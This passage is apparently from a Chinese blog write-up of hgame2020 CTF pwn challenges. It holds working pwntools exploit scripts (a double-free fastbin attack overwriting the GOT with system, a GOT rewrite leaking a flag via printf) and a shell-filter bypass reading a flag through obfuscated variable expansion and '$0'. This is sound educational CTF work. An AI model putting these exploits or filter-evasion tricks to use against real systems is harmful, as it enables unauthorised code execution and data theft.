= <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line">cmd1 = <span class="string">'ls -ali'</span></span><br><span class="line">ru(<span class="string">'find yourself\n'</span>)</span><br><span class="line">sl(cmd1)</span><br><span class="line"><span class="keyword">print</span> ru(<span class="string">'where are you?\n'</span>)</span><br><span class="line"></span><br><span class="line">cmd2 = <span class="string">'a=t;b=ag;ca$a fl$b'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="0x6-官方解"><a href="#0x6-官方解" class="headerlink" title="0x6 官方解"></a>0x6 官方解</h4><ul><li><p>这题本来的考察点<code>proc</code>，硬是让我用<code>ls -i</code>解出来了…还是要多学些东西…</p></li><li><p><code>check1</code> : <code>ls -l /proc/self/cwd</code> </p></li><li><p><code>check2</code>: <code>$0</code> </p></li><li><p>赶紧学习一波<code>/proc</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">% nc 47.103.214.163 21000</span><br><span class="line">find yourself</span><br><span class="line">ls -al &#x2F;proc&#x2F;self&#x2F;</span><br><span class="line">total 0</span><br><span class="line">dr-xr-xr-x   9 1000 1000 0 Feb  1 09:44 .</span><br><span class="line">dr-xr-xr-x 121    0    0 0 Feb  1 09:42 ..</span><br><span class="line">dr-xr-xr-x   2 1000 1000 0 Feb  1 09:44 attr</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 autogroup</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 auxv</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 cgroup</span><br><span class="line">--w-------   1 1000 1000 0 Feb  1 09:44 clear_refs</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 cmdline</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 comm</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 coredump_filter</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 cpuset</span><br><span class="line">lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 cwd -&gt; &#x2F;tmp&#x2F;0xb3f14a49</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 environ</span><br><span class="line">lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 exe -&gt; &#x2F;bin&#x2F;ls</span><br><span class="line">dr-x------   2 1000 1000 0 Feb  1 09:44 fd</span><br><span class="line">dr-x------   2 1000 1000 0 Feb  1 09:44 fdinfo</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 gid_map</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 io</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 limits</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 loginuid</span><br><span class="line">dr-x------   2 1000 1000 0 Feb  1 09:44 map_files</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 maps</span><br><span class="line">-rw-------   1 1000 1000 0 Feb  1 09:44 mem</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 mountinfo</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 mounts</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 mountstats</span><br><span class="line">dr-xr-xr-x   5 1000 1000 0 Feb  1 09:44 net</span><br><span class="line">dr-x--x--x   2 1000 1000 0 Feb  1 09:44 ns</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 numa_maps</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_adj</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 oom_score</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 oom_score_adj</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 pagemap</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 patch_state</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 personality</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 projid_map</span><br><span class="line">lrwxrwxrwx   1 1000 1000 0 Feb  1 09:44 root -&gt; &#x2F;</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 sched</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 schedstat</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 sessionid</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 setgroups</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 smaps_rollup</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 stack</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 stat</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 statm</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 status</span><br><span class="line">-r--------   1 1000 1000 0 Feb  1 09:44 syscall</span><br><span class="line">dr-xr-xr-x   3 1000 1000 0 Feb  1 09:44 task</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 timers</span><br><span class="line">-rw-rw-rw-   1 1000 1000 0 Feb  1 09:44 timerslack_ns</span><br><span class="line">-rw-r--r--   1 1000 1000 0 Feb  1 09:44 uid_map</span><br><span class="line">-r--r--r--   1 1000 1000 0 Feb  1 09:44 wchan</span><br><span class="line">where are you?</span><br><span class="line">&#x2F;tmp&#x2F;0xb3f14a49</span><br><span class="line">$0</span><br><span class="line">exec &gt;&amp;0</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">hgame&#123;You_4re_So_C1EV3R&#125;</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="Roc826"><a href="#Roc826" class="headerlink" title="Roc826"></a>Roc826</h3><ul><li>题目描述：不好好学C的话是很容易随手写出PWN题的</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_2/Roc826" target="_blank" rel="noopener">Roc826</a></li><li>考察点：<code>double free</code>、<code>unsorted bin leak</code></li><li>难度：入门</li><li>分值：300</li><li>完成人数：35</li></ul><p>这题是堆的入门级别的题目，然鹅我并不会做堆的题，所以比赛时没做，后来照着官方wp赶紧学习一波</p><h4 id="0x0-背景姿势"><a href="#0x0-背景姿势" class="headerlink" title="0x0 背景姿势"></a>0x0 背景姿势</h4><ul><li>glibc (&lt;2.27)堆分配的策略：即 first-fit。在分配内存时,malloc 会先到 unsorted bin(或者fastbins) 中查找适合的被 free 的 chunk,如果没有,就会把 unsorted bin 中的所有 chunk 分别放入到所属的 bins 中,然后再去这些 bins 里去找合适的 chunk。可以看到第三次 malloc 的地址和第一次相同,即 malloc 找到了第一次 free 掉的chunk,并把它重新分配。</li><li>fast chunk表示正在使用的长度在<code>32-160</code>(32位系统是<code>16-80</code>)的堆块，而fastbin表示长度在<code>32-180</code>范围内的已经释放的堆块</li></ul><h4 id="0x1-漏洞利用"><a href="#0x1-漏洞利用" class="headerlink" title="0x1 漏洞利用"></a>0x1 漏洞利用</h4><ul><li><p><code>unsorted bin leak</code> ：泄漏<code>main_arena</code>地址（即<code>__malloc_hook-0x68</code>）</p></li><li><p><code>double free</code>：<code>fastbin attack</code>覆写<code>free</code>的<code>got</code>表为<code>system</code>地址，或者改<code>free_hook</code>为<code>one_gadget</code>都可以<code>getshell</code></p></li></ul><h4 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h4>  <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Roc826'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,cont=<span class="string">'aaaa'</span>)</span>:</span></span><br><span class="line">    sla(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sla(<span class="string">'size?\n'</span>,str(size))</span><br><span class="line">    sla(<span class="string">'content:'</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'index?\n'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sla(<span class="string">'index?\n'</span>,str(index))</span><br><span class="line">    ru(<span class="string">'content:'</span>)</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">'-----------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">data = show(<span class="number">0</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>)</span><br><span class="line">log.hexdump(data)</span><br><span class="line">libcbase = u64(data) - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x68</span></span><br><span class="line">info_addr(<span class="string">'libcbase'</span>,libcbase)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">0x58</span>,p64(<span class="number">0x601ffa</span>)) <span class="comment"># got[free]-14-16</span></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'aaaaaaaaaaaaaa'</span>+p64(libcbase+libc.sym[<span class="string">'system'</span>])[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="Another-Heaven"><a href="#Another-Heaven" class="headerlink" title="Another_Heaven"></a>Another_Heaven</h3><ul><li>题目描述：永遠と呼びたい 君に 出逢えた ことだけは（什么鬼…）</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_3/Another_Heaven" target="_blank" rel="noopener">Another_Heaven</a></li><li>考察点：GOT改写</li><li>难度：简单</li><li>分值：200</li><li>完成人数：35</li></ul><h4 id="0x0-程序分析-1"><a href="#0x0-程序分析-1" class="headerlink" title="0x0 程序分析"></a>0x0 程序分析</h4><p>反汇编分析代码，发现有一个<code>Pxxxhub</code>的后门，可修改<code>1</code>字节任意内存：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"There is a back door...\"Hacked by Annevi!\""</span>);</span><br><span class="line">*addr = readi();</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, *addr, <span class="number">1u</span>LL);</span><br></pre></td></tr></table></figure></div><p><code>init()</code>中读了<code>flag</code>，随后有个<code>strcmp</code>对比<code>password</code>与<code>flag</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Password:"</span>, account);</span><br><span class="line">read_n(password, <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(password, flag) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome!The emperor Qie!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"|Recommended|Hottest|Most Viewed......"</span>);</span><br><span class="line">result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>用修改<code>1</code>字节任意内存的后门改写<code>GOT</code>表，把<code>strcmp</code>改为<code>printf</code></p><p>然后就是骚操作了：读<code>password</code>时，输入<code>%s</code>，这时候：</p><blockquote><p><code>strcmp(password, flag)</code>相当于<code>printf(&quot;%s&quot;,flag)</code></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> nc 47.103.214.163 21001</span></span><br><span class="line">There is a back door..."Hacked by Annevi!"</span><br><span class="line">6299752</span><br><span class="line">&amp;</span><br><span class="line">==========================================</span><br><span class="line">____</span><br><span class="line">|  _ \ ___  _ __ _ __ | | | |_   _| |__  </span><br><span class="line">| |_) / _ \| '__| '_ \| |_| | | | | '_ \ </span><br><span class="line">|  __/ (_) | |  | | | |  _  | |_| | |_) |</span><br><span class="line">|_|   \___/|_|  |_| |_|_| |_|\__,_|_.__/ </span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Login System</span><br><span class="line">Account:Password:%s</span><br><span class="line">hgame&#123;VGhlX2Fub3RoZXJfd2F5X3RvX2hlYXZlbg==&#125;Wrong Password!</span><br><span class="line">Forgot your password?(y/n)</span><br></pre></td></tr></table></figure></div><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Another_Heaven'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">p = process(local_file)</span><br><span class="line">libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">p = remote(host, port)</span><br><span class="line">libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment">#info</span></span><br><span class="line">strcmp_got = elf.got[<span class="string">'strcmp'</span>]</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'There is a back door..."Hacked by Annevi!"\n'</span>)</span><br><span class="line">sl(str(strcmp_got))</span><br><span class="line">sl(<span class="string">'\x26'</span>) <span class="comment"># strcmp_got -&gt; printf_got </span></span><br><span class="line">ru(<span class="string">'Password:'</span>)</span><br><span class="line">sl(<span class="string">'%s'</span>) <span class="comment"># strcmp(password,flag) -&gt; printf("%s",flag)</span></span><br><span class="line">flag = ru(<span class="string">'Wrong Password!\n'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'flag is: '</span> + flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="形而上的坏死"><a href="#形而上的坏死" class="headerlink" title="形而上的坏死"></a>形而上的坏死</h3><ul><li>题目描述：Can you deceive the world？The lonely observer！</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_4/Metaphysical_Necrosis" target="_blank" rel="noopener">Metaphysical_Necrosis</a></li><li>考察点：视力(官方)</li><li>难度：中等</li><li>分值：400</li><li>完成人数：19</li></ul><h4 id="0x0-准备工作"><a href="#0x0-准备工作" class="headerlink" title="0x0 准备工作"></a>0x0 准备工作</h4><p>首先查保护机制，能打开的都打开了。。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div><p>先执行一下程序，熟悉下程序的流程：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 